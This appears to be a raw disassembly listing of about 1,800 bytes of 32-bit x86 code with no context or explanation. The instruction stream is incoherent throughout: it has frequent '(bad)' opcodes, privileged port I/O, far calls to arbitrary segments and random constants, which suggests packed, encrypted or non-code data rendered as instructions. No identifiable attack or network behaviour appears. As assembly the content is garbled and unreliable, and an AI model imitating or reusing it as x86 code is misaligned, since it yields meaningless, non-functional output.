  41b2b5:	(bad)  
  41b2b7:	in     al,0x94
  41b2b9:	cli    
  41b2ba:	mov    ebx,0x481693bf
  41b2bf:	int    0x70
  41b2c1:	fstp   QWORD PTR [esi]
  41b2c3:	mov    eax,0x1864055b
  41b2c8:	out    0xdc,al
  41b2ca:	pop    ecx
  41b2cb:	push   ecx
  41b2cc:	push   ebp
  41b2cd:	mov    ch,0x2d
  41b2cf:	rep outs dx,BYTE PTR ds:[esi]
  41b2d1:	stc    
  41b2d2:	dec    ebx
  41b2d3:	pop    esi
  41b2d4:	xchg   ebp,eax
  41b2d5:	stc    
  41b2d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2d7:	dec    ebx
  41b2d8:	xor    ebx,0x79
  41b2db:	addr16 cdq 
  41b2dd:	pop    esp
  41b2de:	clc    
  41b2df:	adc    al,0x32
  41b2e1:	add    al,0xae
  41b2e3:	fadd   st(7),st
  41b2e5:	arpl   WORD PTR [edx-0xb],di
  41b2e8:	inc    ebp
  41b2e9:	rcr    DWORD PTR [edi+0x7f03e536],1
  41b2ef:	ss int3 
  41b2f1:	push   cs
  41b2f2:	push   cs
  41b2f3:	into   
  41b2f4:	push   esp
  41b2f5:	in     eax,dx
  41b2f6:	mov    edi,0x6b0e59ec
  41b2fb:	fs daa 
  41b2fd:	cdq    
  41b2fe:	lods   eax,DWORD PTR ds:[esi]
  41b2ff:	mov    dh,0xe1
  41b301:	dec    esp
  41b302:	test   DWORD PTR [eax],eax
  41b304:	ds ins BYTE PTR es:[edi],dx
  41b306:	ror    BYTE PTR [eax],1
  41b308:	cli    
  41b309:	xor    eax,0x1ad65035
  41b30e:	out    0x6a,eax
  41b310:	inc    esi
  41b311:	scas   al,BYTE PTR es:[edi]
  41b312:	mov    ds:0xbbc5afc9,al
  41b317:	cmp    dh,ah
  41b319:	mov    DWORD PTR [edx-0x7d],0xa775088b
  41b320:	addps  xmm2,XMMWORD PTR [esi+0x280c4ebc]
  41b327:	lds    ebx,FWORD PTR [ecx+eiz*8]
  41b32a:	mov    bh,0xfa
  41b32c:	loope  0x41b2c3
  41b32e:	jbe    0x41b2b1
  41b330:	int    0xbb
  41b332:	xchg   BYTE PTR [bp+di+0x2c],ch
  41b336:	leave  
  41b337:	ins    BYTE PTR es:[edi],dx
  41b338:	or     esi,0x1f916b85
  41b33e:	xor    BYTE PTR [ecx+0x355b5f0d],bh
  41b344:	je     0x41b38f
  41b346:	out    0x3e,eax
  41b348:	mov    gs,ebp
  41b34a:	call   0x4e9e0acc
  41b34f:	push   esi
  41b350:	pop    esp
  41b351:	sub    DWORD PTR [edi+0x2128d398],ebx
  41b357:	fwait
  41b358:	aad    0xa5
  41b35a:	fstp   DWORD PTR [ebx]
  41b35c:	add    BYTE PTR [ecx+ecx*8],bh
  41b35f:	mov    bl,0xc5
  41b361:	push   edx
  41b362:	sahf   
  41b363:	mov    ss,WORD PTR [ecx]
  41b365:	mov    DWORD PTR [ebx-0x50741bf],esp
  41b36b:	xlat   BYTE PTR ds:[ebx]
  41b36c:	rcl    BYTE PTR [ebx+0x4aef18e9],1
  41b372:	pop    ds
  41b373:	fidivr WORD PTR [ebx]
  41b375:	add    BYTE PTR [edx-0x420ac7a2],dh
  41b37b:	cdq    
  41b37c:	test   ebx,ebx
  41b37e:	arpl   cx,sp
  41b380:	(bad)  [ecx+edx*1+0x2c]
  41b384:	sbb    BYTE PTR ds:0xeb696f,bh
  41b38a:	xchg   esp,eax
  41b38b:	xor    eax,0x1550a6a2
  41b390:	xlat   BYTE PTR ds:[ebx]
  41b391:	in     eax,dx
  41b392:	sub    eax,0x187c15fb
  41b397:	jb     0x41b37a
  41b399:	mov    ch,0x52
  41b39b:	inc    ebx
  41b39c:	cmp    edi,DWORD PTR [ebp-0x52]
  41b39f:	cmp    ebp,edi
  41b3a1:	dec    edi
  41b3a2:	aad    0x20
  41b3a4:	outs   dx,DWORD PTR ds:[esi]
  41b3a5:	cwde   
  41b3a6:	nop
  41b3a7:	dec    edx
  41b3a8:	pop    esp
  41b3a9:	daa    
  41b3aa:	cmp    BYTE PTR [eax],bl
  41b3ac:	pop    esp
  41b3ad:	mov    BYTE PTR [edi+0x11189ccd],bh
  41b3b3:	pop    ss
  41b3b4:	popa   
  41b3b5:	pop    ebx
  41b3b6:	add    ebx,ecx
  41b3b8:	arpl   WORD PTR [ebp-0x41],dx
  41b3bb:	xor    eax,0xe5ef819c
  41b3c0:	mov    cl,0x8
  41b3c2:	std    
  41b3c3:	lahf   
  41b3c4:	fist   WORD PTR [edx+0x28]
  41b3c7:	cmp    esi,DWORD PTR [edx]
  41b3c9:	stos   DWORD PTR es:[edi],eax
  41b3ca:	je     0x41b356
  41b3cc:	inc    ecx
  41b3cd:	cmp    al,0x4b
  41b3cf:	loop   0x41b43f
  41b3d1:	leave  
  41b3d2:	inc    eax
  41b3d3:	(bad)  
  41b3d4:	std    
  41b3d5:	rcl    BYTE PTR [esi+ebp*2-0x53],1
  41b3d9:	mov    ah,0x42
  41b3db:	mov    WORD PTR [ebp-0x75e00253],?
  41b3e1:	or     DWORD PTR [eax],ecx
  41b3e3:	or     edi,DWORD PTR ds:0x71614840
  41b3e9:	xchg   DWORD PTR [esi],esp
  41b3eb:	push   ebp
  41b3ec:	leave  
  41b3ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3ee:	int3   
  41b3ef:	pop    ecx
  41b3f0:	outs   dx,BYTE PTR ds:[esi]
  41b3f1:	xor    edx,DWORD PTR [esi+ecx*1+0x2d]
  41b3f5:	std    
  41b3f6:	clc    
  41b3f7:	or     BYTE PTR [edx+0x37],al
  41b3fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3fb:	add    eax,ebp
  41b3fd:	cmp    ebx,DWORD PTR cs:[eax]
  41b400:	cwde   
  41b401:	lahf   
  41b402:	jo     0x41b3fd
  41b404:	xor    DWORD PTR [eax-0x2067e3ae],ecx
  41b40a:	aas    
  41b40b:	hlt    
  41b40c:	stos   DWORD PTR es:[edi],eax
  41b40d:	pusha  
  41b40e:	rcl    DWORD PTR [ecx],cl
  41b410:	dec    edx
  41b411:	enter  0xa793,0x20
  41b415:	or     ch,BYTE PTR [ecx+0x6a8075dd]
  41b41b:	daa    
  41b41c:	sub    al,0xaa
  41b41e:	xchg   ebx,eax
  41b41f:	push   ebx
  41b420:	mov    eax,0xec3c72ce
  41b425:	push   esp
  41b426:	sbb    DWORD PTR [ecx+ebp*4-0x2cc4c540],edx
  41b42d:	cmp    eax,0x6c2af657
  41b432:	sub    eax,edx
  41b434:	mov    al,0xdd
  41b436:	out    0xb5,al
  41b438:	mul    BYTE PTR [esi+0xef57c30]
  41b43e:	and    ecx,DWORD PTR [esi]
  41b440:	imul   edi,esi,0xffffff99
  41b443:	iret   
  41b444:	in     eax,0x34
  41b446:	popa   
  41b447:	sub    eax,0xf75e8bd0
  41b44c:	xchg   ecx,eax
  41b44d:	xchg   dh,bh
  41b44f:	(bad)  
  41b450:	sub    eax,0x6c93db44
  41b455:	sbb    esi,0xffffff82
  41b458:	call   0x713d:0x326a299d
  41b45f:	fist   DWORD PTR [edi-0x1fa5ec41]
  41b465:	mov    ch,0x35
  41b467:	mov    ebx,0x3436cde0
  41b46c:	pop    ecx
  41b46d:	jmp    0x16af:0xb773229
  41b474:	retf   0xeea4
  41b477:	push   0x23
  41b479:	fist   WORD PTR [esp+edi*4-0x693886ea]
  41b480:	(bad)  
  41b481:	jg     0x41b41b
  41b483:	lahf   
  41b484:	aad    0x13
  41b486:	pop    es
  41b487:	adc    BYTE PTR [esi],dl
  41b489:	test   eax,0xa07a7479
  41b48e:	push   0x12
  41b490:	shl    BYTE PTR [esi+0x73fd257f],0x64
  41b497:	mov    al,0x7e
  41b499:	call   0x132f:0x431d6d99
  41b4a0:	mov    ebp,0x7bc992e
  41b4a5:	in     al,dx
  41b4a6:	mov    eax,0xed63595c
  41b4ab:	dec    eax
  41b4ac:	fnstcw WORD PTR [edx-0x400d1b02]
  41b4b2:	dec    ebp
  41b4b3:	mov    bl,0x9f
  41b4b5:	sahf   
  41b4b6:	(bad)  
  41b4b7:	test   eax,0x4de99cb
  41b4bc:	add    eax,DWORD PTR [edx*4+0x782dab66]
  41b4c3:	test   eax,0xddeb54e5
  41b4c8:	jl     0x41b506
  41b4ca:	mov    edx,0xf654e478
  41b4cf:	xor    dl,BYTE PTR [edi+eax*1]
  41b4d2:	jl     0x41b4be
  41b4d4:	sbb    ebx,0x7a
  41b4d7:	adc    eax,DWORD PTR [ecx]
  41b4d9:	add    cl,BYTE PTR [eax-0x2e]
  41b4dc:	push   ecx
  41b4dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4de:	adc    bl,bl
  41b4e0:	leave  
  41b4e1:	mov    ebx,0xdad084aa
  41b4e6:	ds jns 0x41b555
  41b4e9:	sub    cl,0x5e
  41b4ec:	retf   
  41b4ed:	pop    ebp
  41b4ee:	inc    esi
  41b4ef:	(bad)  
  41b4f0:	jne    0x41b531
  41b4f2:	sub    ebp,DWORD PTR [edx+0xd]
  41b4f5:	scas   eax,DWORD PTR es:[edi]
  41b4f6:	mov    dh,0xd
  41b4f8:	mov    edx,0x750e3aa
  41b4fd:	repz pushf 
  41b4ff:	xlat   BYTE PTR ds:[ebx]
  41b500:	out    0x6d,al
  41b502:	test   eax,0x66eb5358
  41b507:	add    al,0x8d
  41b509:	push   esi
  41b50a:	and    eax,0xab6a25f3
  41b50f:	(bad)
  41b513:	cs add eax,0xb959adda
  41b519:	cmp    BYTE PTR [eax+ebx*4],ah
  41b51c:	sub    edi,DWORD PTR [esi]
  41b51e:	mov    ch,0xb9
  41b520:	inc    esi
  41b521:	in     eax,dx
  41b522:	mov    WORD PTR [eax-0x6e],es
  41b525:	fistp  WORD PTR [ecx]
  41b527:	(bad)  
  41b528:	mov    bl,0xa1
  41b52a:	xlat   BYTE PTR ds:[ebx]
  41b52b:	rcr    BYTE PTR [edi-0x46],cl
  41b52e:	pop    eax
  41b52f:	lods   eax,DWORD PTR ds:[esi]
  41b530:	pop    ecx
  41b531:	mov    bh,0xbe
  41b533:	pusha  
  41b534:	mov    ds:0x355d4681,eax
  41b539:	jb     0x41b568
  41b53b:	mov    ebp,0x36083269
  41b540:	lods   al,BYTE PTR ds:[esi]
  41b541:	sub    BYTE PTR [edx+eiz*2],dh
  41b544:	popf   
  41b545:	mov    bl,0xaa
  41b547:	pop    esi
  41b548:	popf   
  41b549:	mov    al,ds:0xaf71ef1f
  41b54e:	sub    BYTE PTR [edx-0x40],cl
  41b551:	(bad)  
  41b552:	out    0xc1,eax
  41b554:	sbb    esi,esp
  41b556:	xchg   esi,eax
  41b557:	pushf  
  41b558:	inc    edx
  41b559:	xlat   BYTE PTR ds:[ebx]
  41b55a:	and    dh,BYTE PTR [esi+0x61]
  41b55d:	pop    ebx
  41b55e:	inc    ecx
  41b55f:	dec    ebp
  41b560:	hlt    
  41b561:	jns    0x41b551
  41b563:	push   es
  41b564:	int    0xb0
  41b566:	mul    BYTE PTR [edi]
  41b568:	shr    DWORD PTR [eax+ebx*4-0x6673b506],1
  41b56f:	test   DWORD PTR [edi-0x4c],ebx
  41b572:	scas   eax,DWORD PTR es:[edi]
  41b573:	shr    ah,0x6a
  41b576:	ja     0x41b545
  41b578:	(bad)  
  41b579:	push   ecx
  41b57a:	mov    ds:0x897cfee1,eax
  41b57f:	or     esi,DWORD PTR [edx]
  41b581:	aaa    
  41b582:	xchg   esp,eax
  41b583:	mov    cl,0x5c
  41b585:	repz sti 
  41b587:	das    
  41b588:	mov    ebp,0x75077b1b
  41b58d:	fist   WORD PTR [ebx]
  41b58f:	mov    ds:0x37842cbe,eax
  41b594:	pusha  
  41b595:	nop
  41b596:	inc    ecx
  41b597:	push   cs
  41b598:	xor    eax,0x6f70912e
  41b59d:	push   cs
  41b59e:	(bad)  
  41b59f:	not    BYTE PTR [esi+0x65a8e532]
  41b5a5:	mov    eax,ds:0xe09d90fb
  41b5aa:	loopne 0x41b5c1
  41b5ac:	js     0x41b58c
  41b5ae:	mov    al,ds:0xd65f56e6
  41b5b3:	inc    esi
  41b5b4:	or     esi,eax
  41b5b6:	or     eax,DWORD PTR [edi-0x7d]
  41b5b9:	hlt    
  41b5ba:	mov    dh,0x71
  41b5bc:	mov    ecx,0x754c07a
  41b5c1:	or     al,0x10
  41b5c3:	retf   0x3ca9
  41b5c6:	xlat   BYTE PTR ds:[ebx]
  41b5c7:	ror    DWORD PTR [edx+0x4264baf9],1
  41b5cd:	jbe    0x41b5be
  41b5cf:	jo     0x41b5dc
  41b5d1:	retf   
  41b5d2:	cli    
  41b5d3:	ins    DWORD PTR es:[edi],dx
  41b5d4:	add    ebp,ebx
  41b5d6:	mov    ah,0xa5
  41b5d8:	dec    esp
  41b5d9:	jnp    0x41b5ab
  41b5db:	inc    esp
  41b5dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5dd:	daa    
  41b5de:	(bad)  
  41b5df:	adc    eax,0x98cae956
  41b5e4:	sar    bh,1
  41b5e6:	fcmovne st,st(5)
  41b5e8:	mov    DWORD PTR [ebx+ebp*1+0x445aef19],esp
  41b5ef:	stos   BYTE PTR es:[edi],al
  41b5f0:	mov    al,ds:0xf5358ce0
  41b5f5:	add    al,BYTE PTR [esi+0x4e]
  41b5f8:	and    BYTE PTR [eax],cl
  41b5fa:	in     eax,0x74
  41b5fc:	xor    cl,BYTE PTR [ecx-0x4f83193f]
  41b602:	jns    0x41b5ca
  41b604:	mov    ch,al
  41b606:	shl    BYTE PTR [ebx+0x39],1
  41b609:	cs xchg esp,eax
  41b60b:	icebp  
  41b60c:	jecxz  0x41b58f
  41b60e:	aas    
  41b60f:	gs out 0x7,al
  41b612:	scas   eax,DWORD PTR es:[edi]
  41b613:	sar    BYTE PTR [esp+esi*2+0x5d70c8d2],0xd0
  41b61b:	mov    bh,0xc
  41b61d:	leave  
  41b61e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b61f:	mul    BYTE PTR [edi]
  41b621:	add    al,0xa5
  41b623:	add    esi,DWORD PTR [edi]
  41b625:	mov    BYTE PTR [ebp+0x31d7b931],dh
  41b62b:	enter  0x21f1,0x8d
  41b62f:	or     BYTE PTR [ebp-0x38],al
  41b632:	aad    0x7d
  41b634:	fidiv  WORD PTR [ecx-0x47]
  41b637:	xchg   esi,eax
  41b638:	xchg   ecx,eax
  41b639:	add    al,0x10
  41b63b:	pop    ecx
  41b63c:	sbb    DWORD PTR [ecx],edx
  41b63e:	les    eax,FWORD PTR [ecx]
  41b640:	xchg   DWORD PTR [edx-0x34457ffc],ebx
  41b646:	mov    ah,0xc3
  41b648:	(bad)  
  41b649:	cmp    al,0x4b
  41b64b:	scas   eax,DWORD PTR es:[edi]
  41b64c:	(bad)  
  41b64d:	in     eax,dx
  41b64e:	xor    DWORD PTR [eax],edi
  41b650:	inc    edx
  41b651:	lea    esp,[esi-0xe]
  41b654:	pop    esi
  41b655:	cmp    al,0x67
  41b657:	sub    al,0xc4
  41b659:	in     eax,0x25
  41b65b:	dec    ebx
  41b65c:	mov    al,0xd3
  41b65e:	sbb    eax,0x4b7d324c
  41b663:	lahf   
  41b664:	pop    esp
  41b665:	(bad)  
  41b666:	lods   al,BYTE PTR ds:[esi]
  41b667:	xchg   ecx,eax
  41b668:	imul   esi,DWORD PTR [edi-0x5c1f852d],0x9
  41b66f:	xor    eax,0x73569027
  41b674:	jnp    0x41b6c8
  41b676:	dec    eax
  41b677:	hlt    
  41b678:	das    
  41b679:	xor    eax,DWORD PTR [ebp+0x55a3d101]
  41b67f:	outs   dx,DWORD PTR ds:[esi]
  41b680:	jns    0x41b695
  41b682:	adc    ch,bh
  41b684:	out    dx,eax
  41b685:	ret    
  41b686:	int    0x70
  41b688:	imul   edi,ecx,0x37
  41b68b:	or     cl,BYTE PTR ds:0xc357ec19
  41b691:	jge    0x41b664
  41b693:	dec    edx
  41b694:	sub    bh,0x8f
  41b697:	jb     0x41b6bb
  41b699:	inc    eax
  41b69a:	(bad)  
  41b69d:	stos   DWORD PTR es:[edi],eax
  41b69e:	stos   BYTE PTR es:[edi],al
  41b69f:	fwait
  41b6a0:	add    eax,0x996e36f1
  41b6a5:	mov    ds:0x9a2c08a0,al
  41b6aa:	mov    al,0x1a
  41b6ac:	and    edx,DWORD PTR [ecx]
  41b6ae:	push   esi
  41b6af:	ins    BYTE PTR es:[edi],dx
  41b6b0:	cs push ds
  41b6b2:	je     0x41b6fc
  41b6b4:	pusha  
  41b6b5:	and    ebx,DWORD PTR [ecx-0x76]
  41b6b8:	pop    es
  41b6b9:	add    DWORD PTR [ebx+0x24dbc96d],ebx
  41b6bf:	jb     0x41b685
  41b6c1:	pop    edx
  41b6c2:	cdq    
  41b6c3:	retf   
  41b6c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6c5:	pop    esi
  41b6c6:	add    bh,bl
  41b6c8:	adc    esp,DWORD PTR [eax-0x4156632f]
  41b6ce:	jp     0x41b6e3
  41b6d0:	adc    eax,0x76716398
  41b6d5:	dec    esp
  41b6d6:	mov    ecx,0xc65610f6
  41b6db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6dc:	in     eax,dx
  41b6dd:	push   ebp
  41b6de:	aas    
  41b6df:	or     ebx,edi
  41b6e1:	test   DWORD PTR [ebp-0x71c7d410],ebp
  41b6e7:	cmp    al,0xc9
  41b6e9:	mov    al,ds:0x76a8eff8
  41b6ee:	lahf   
  41b6ef:	sbb    DWORD PTR ds:0xa2efdfcc,ebp
  41b6f5:	lock das 
  41b6f7:	mov    eax,ds:0x3a0de06b
  41b6fc:	mov    BYTE PTR [ecx+0x2a],0x15
  41b700:	dec    ebx
  41b701:	out    0x11,al
  41b703:	xor    eax,0x87776427
  41b708:	jae    0x41b748
  41b70a:	imul   esi,DWORD PTR [edx+0x78],0xf
  41b70e:	mov    al,ds:0x9b1ffaff
  41b713:	push   ebp
  41b714:	pop    esi
  41b715:	cmp    dh,cl
  41b717:	push   esi
  41b718:	inc    edi
  41b719:	imul   esp,DWORD PTR [eax],0x6ed005ec
  41b71f:	xor    eax,0xcaaf2bf6
  41b724:	je     0x41b708
  41b726:	enter  0x2b63,0xcf
  41b72a:	pop    ecx
  41b72b:	mov    edx,0x9437f950
  41b730:	cmp    DWORD PTR [ebx-0x22960258],esp
  41b736:	outs   dx,DWORD PTR ds:[esi]
  41b737:	ror    DWORD PTR [ecx-0xa4d4dcf],cl
  41b73d:	xchg   esp,eax
  41b73e:	pop    eax
  41b73f:	xchg   ecx,eax
  41b740:	mov    bh,0x25
  41b742:	mov    eax,ds:0xe18e07c6
  41b747:	and    esi,DWORD PTR [ebx]
  41b749:	mov    esp,0xcb8fe9ea
  41b74e:	mov    ebp,0x76533126
  41b753:	in     eax,dx
  41b754:	lea    esi,ds:0x25975f10
  41b75a:	lods   eax,DWORD PTR ds:[esi]
  41b75b:	iret   
  41b75c:	cmp    ch,0xee
  41b75f:	cmp    eax,0xdd4efec4
  41b764:	jecxz  0x41b715
  41b766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b767:	cmp    al,0xde
  41b769:	pop    edi
  41b76a:	inc    edx
  41b76b:	mov    dh,0xab
  41b76e:	ret    
  41b76f:	in     eax,0x2a
  41b771:	(bad)  
  41b773:	jns    0x41b757
  41b775:	outs   dx,DWORD PTR ds:[esi]
  41b776:	dec    eax
  41b777:	xor    BYTE PTR [ebp-0x248e9d3e],dl
  41b77d:	xchg   bh,cl
  41b77f:	push   ss
  41b780:	mov    ah,0xe5
  41b782:	mov    BYTE PTR [edi-0x4e],ah
  41b785:	fcomp  DWORD PTR [ebx-0x34]
  41b788:	and    dl,bh
  41b78a:	push   cx
  41b78c:	hlt    
  41b78d:	sub    DWORD PTR [edx],edi
  41b78f:	and    eax,0x784b9c5e
  41b794:	ss fs stc 
  41b797:	dec    esi
  41b798:	mov    edi,0x8416e843
  41b79d:	cmp    eax,0xf229dbb3
  41b7a2:	inc    esi
  41b7a3:	xchg   DWORD PTR [ebp-0x7a5bba4e],ebx
  41b7a9:	inc    edi
  41b7aa:	fwait
  41b7ab:	pop    ecx
  41b7ac:	xchg   ebp,eax
  41b7ad:	and    eax,0x42c200f9
  41b7b2:	mov    ebp,0xa4dd21a8
  41b7b7:	in     eax,0x2
  41b7b9:	rcr    DWORD PTR [ecx],cl
  41b7bb:	inc    edi
  41b7bc:	shl    BYTE PTR [esi+0x4df6081b],1
  41b7c2:	mov    WORD PTR [edi+eiz*4-0x6f],ds
  41b7c6:	sahf   
  41b7c7:	inc    ebx
  41b7c8:	pop    esi
  41b7c9:	jmp    0x41b82b
  41b7cb:	(bad)  
  41b7cc:	push   esp
  41b7cd:	xchg   esp,eax
  41b7ce:	mov    al,0x50
  41b7d0:	push   ds
  41b7d1:	sar    dh,cl
  41b7d3:	inc    ecx
  41b7d4:	pop    ecx
  41b7d5:	hlt    
  41b7d6:	mov    cl,0x96
  41b7d8:	mov    WORD PTR ds:0x1302cb99,cs
  41b7de:	mov    edi,0xbe9d668b
  41b7e3:	mov    DWORD PTR [ecx+0x48],edi
  41b7e6:	xchg   esp,esi
  41b7e8:	adc    dh,BYTE PTR [ebx]
  41b7ea:	mov    bl,0x5f
  41b7ec:	lahf   
  41b7ed:	dec    eax
  41b7ee:	sub    bl,ch
  41b7f0:	std    
  41b7f1:	imul   edx,DWORD PTR [edi+0x7bb9d420],0xffffff88
  41b7f8:	push   ebp
  41b7f9:	into   
  41b7fa:	push   ss
  41b7fb:	push   ds
  41b7fc:	int3   
  41b7fd:	enter  0x2dca,0xa3
  41b801:	mov    WORD PTR [edi-0x3e],cs
  41b804:	cmp    esp,DWORD PTR [eax+0x74]
  41b807:	cld    
  41b808:	mov    ch,0xe
  41b80a:	cmp    al,0xa6
  41b80c:	push   0x64
  41b80e:	clc    
  41b80f:	(bad)  
  41b810:	dec    esp
  41b811:	cmp    al,0xd3
  41b813:	xor    eax,DWORD PTR [esi+0x789d4192]
  41b819:	cmp    bl,BYTE PTR [eax-0x158e1e97]
  41b81f:	mov    ebp,0x18837507
  41b824:	fld    QWORD PTR [esi]
  41b826:	fs in  eax,dx
  41b828:	imul   ebp,ebx,0x9e935c2
  41b82e:	inc    edx
  41b82f:	fistp  QWORD PTR [eax]
  41b831:	inc    edx
  41b832:	mov    cl,0xb0
  41b834:	pop    edi
  41b835:	jmp    0xbbd6336b
  41b83a:	ds nop
  41b83c:	into   
  41b83d:	sbb    edi,DWORD PTR [edi]
  41b83f:	fidivr DWORD PTR [esi-0x53a5c5c0]
  41b845:	mov    esp,0xf2283933
  41b84a:	xchg   ebx,eax
  41b84b:	or     BYTE PTR [edi+0x18a86122],bl
  41b851:	jno    0x41b840
  41b853:	sbb    DWORD PTR [ebx+0x2b068c5a],ebp
  41b859:	imul   ebp,DWORD PTR [ebx],0x3d5ab98f
  41b85f:	call   0x49de:0xde5caf4e
  41b866:	mov    edi,0xc342184e
  41b86b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b86c:	sbb    BYTE PTR [edi],0xb7
  41b86f:	ret    
  41b870:	and    BYTE PTR [edx],0x1c
  41b873:	mov    al,ds:0x52efa2e1
  41b878:	xor    DWORD PTR [esi+0x2ae8ca6c],0x65
  41b87f:	xchg   edi,eax
  41b880:	or     cl,BYTE PTR [ecx-0x19]
  41b883:	dec    ecx
  41b884:	jge    0x41b81f
  41b886:	xchg   ecx,eax
  41b887:	xchg   esi,eax
  41b888:	aas    
  41b889:	ret    0x5cde
  41b88c:	mov    ecx,0xd3b2d02f
  41b891:	sti    
  41b892:	test   al,0x7c
  41b894:	mov    BYTE PTR [eax+0x43],0x90
  41b898:	mov    esp,0xea27a06e
  41b89d:	xchg   edi,eax
  41b89e:	scas   al,BYTE PTR es:[edi]
  41b89f:	loope  0x41b915
  41b8a1:	arpl   WORD PTR [edx-0x25a89350],bp
  41b8a7:	lods   eax,DWORD PTR ds:[esi]
  41b8a8:	mov    ebx,0x1d9c73a3
  41b8ad:	(bad)  
  41b8ae:	mov    bl,0xc9
  41b8b0:	cmc    
  41b8b1:	xor    ch,BYTE PTR [edx-0x30ee9cc2]
  41b8b7:	call   0x5a28d932
  41b8bc:	xor    eax,0xd73f88af
  41b8c1:	mov    bh,0x6a
  41b8c3:	rdtsc  
  41b8c5:	js     0x41b907
  41b8c7:	enter  0xe995,0xe4
  41b8cb:	and    dl,dh
  41b8cd:	xchg   edi,eax
  41b8ce:	arpl   WORD PTR [esi+0x33c1fbfc],sp
  41b8d4:	cwde   
  41b8d5:	enter  0xbae5,0x25
  41b8d9:	(bad)  
  41b8da:	fnstenv [ebx]
  41b8dc:	cmp    DWORD PTR [eax],0x779fa54f
  41b8e2:	push   edi
  41b8e3:	les    edx,FWORD PTR [esi+edx*1+0x77]
  41b8e7:	xor    ebp,0x8
  41b8ea:	push   cs
  41b8eb:	push   edi
  41b8ec:	neg    DWORD PTR [ebx-0x2a]
  41b8ef:	push   gs
  41b8f1:	test   DWORD PTR [esi+esi*2-0x12],edi
  41b8f5:	jecxz  0x41b8dd
  41b8f7:	lea    ecx,[eax+ebx*1]
  41b8fa:	xor    DWORD PTR [esi],ecx
  41b8fc:	fiadd  WORD PTR [edi]
  41b8fe:	xchg   edi,eax
  41b8ff:	mov    dl,0xaf
  41b901:	scas   eax,DWORD PTR es:[edi]
  41b902:	pop    edi
  41b903:	inc    esp
  41b904:	push   ebx
  41b905:	daa    
  41b906:	pop    ds
  41b907:	loop   0x41b92c
  41b909:	test   DWORD PTR [ebp+ecx*1-0x76830eb2],ebp
  41b910:	and    al,0x2f
  41b912:	ret    
  41b913:	pop    edx
  41b914:	retf   0x6c90
  41b917:	and    al,0xc3
  41b919:	sahf   
  41b91a:	xchg   ecx,eax
  41b91b:	cdq    
  41b91c:	sub    BYTE PTR [esi+0x25fdd655],ch
  41b922:	in     eax,0xeb
  41b924:	pop    ebx
  41b925:	jno    0x41b961
  41b927:	in     eax,dx
  41b928:	push   esi
  41b929:	popa   
  41b92a:	jne    0x41b903
  41b92c:	fs jl  0x41b97d
  41b92f:	xor    DWORD PTR [ecx],esp
  41b931:	cwde   
  41b932:	and    al,ch
  41b934:	repz push ecx
  41b936:	push   0xffffffab
  41b938:	(bad)  
  41b939:	leave  
  41b93a:	je     0x41b8d1
  41b93c:	cwde   
  41b93d:	mov    bl,0xf3
  41b93f:	in     eax,0xae
  41b941:	popa   
  41b942:	push   es
  41b943:	jb     0x41b9ad
  41b945:	dec    edx
  41b946:	jle    0x41b974
  41b948:	ror    dl,1
  41b94a:	or     al,0xb5
  41b94c:	mov    al,fs:0x3aa817ac
  41b952:	inc    ecx
  41b953:	mov    ecx,0x9f85eaae
  41b958:	aam    0x1b
  41b95a:	imul   ecx,DWORD PTR [ebx+ecx*2+0x2054a9cc],0xffffffc0
  41b962:	adc    al,0x92
  41b964:	outs   dx,DWORD PTR ds:[esi]
  41b965:	ss inc esp
  41b967:	sbb    al,0x99
  41b969:	mov    ds:0xe7965c78,al
  41b96e:	pmaddwd mm2,QWORD PTR ds:0xa509f8b2
  41b975:	adc    ah,BYTE PTR [eax-0x14]
  41b978:	mov    WORD PTR [esi-0x1b],ss
  41b97b:	adc    al,0xb2
  41b97d:	pusha  
  41b97e:	popa   
  41b97f:	scas   eax,DWORD PTR es:[edi]
  41b980:	or     DWORD PTR [ecx-0x26c8e08e],ecx
  41b986:	and    ch,dl
  41b988:	pusha  
  41b989:	ss adc al,0x55
  41b98c:	jmp    0x41b948
  41b98e:	(bad)  
  41b98f:	jg     0x41b9f0
  41b991:	mov    WORD PTR [eax+eax*8],gs
  41b994:	and    cl,BYTE PTR [edi-0x4b]
  41b997:	loope  0x41b94e
  41b999:	jno    0x41b9fd
  41b99b:	out    0x94,eax
  41b99d:	retf   
  41b99e:	push   ebp
  41b99f:	cld    
  41b9a0:	fisttp DWORD PTR [ebx]
  41b9a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9a3:	dec    ebx
  41b9a4:	dec    edx
  41b9a5:	ins    BYTE PTR es:[edi],dx
  41b9a6:	mov    WORD PTR [ebp-0x35],ss
  41b9a9:	xchg   esp,eax
  41b9aa:	push   esi
  41b9ab:	inc    esi
  41b9ac:	call   0x8c0d:0xaf8de668
  41b9b3:	jbe    0x41b944
  41b9b5:	inc    ebx
  41b9b6:	xchg   ebp,eax
  41b9b7:	jb     0x41b9e0
  41b9b9:	rcl    DWORD PTR [esi-0xa953d54],0x99
  41b9c0:	pop    edx
  41b9c1:	mov    esi,0x8cdf16f4
  41b9c6:	adc    bh,dh
  41b9c8:	lods   eax,DWORD PTR es:[esi]
  41b9ca:	add    dh,ch
  41b9cc:	ja     0x41ba40
  41b9ce:	out    0xe3,al
  41b9d0:	inc    ecx
  41b9d1:	inc    esi
  41b9d2:	or     ebp,ecx
  41b9d4:	xor    DWORD PTR [esi],edi
  41b9d6:	cmp    al,0xd6
  41b9d8:	jb     0x41b9a7
  41b9da:	jno    0x41b9a6
  41b9dc:	jg     0x41ba1c
  41b9de:	mov    ds:0x1753b242,al
  41b9e3:	and    cl,cl
  41b9e5:	in     eax,dx
  41b9e6:	inc    eax
  41b9e7:	sbb    BYTE PTR [edx-0x41],bl
  41b9ea:	push   0xffffffe0
  41b9ec:	out    dx,al
  41b9ed:	les    esi,FWORD PTR [edi]
  41b9ef:	(bad)  
  41b9f0:	ror    BYTE PTR [esi+0x775d6e53],1
  41b9f6:	clc    
  41b9f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
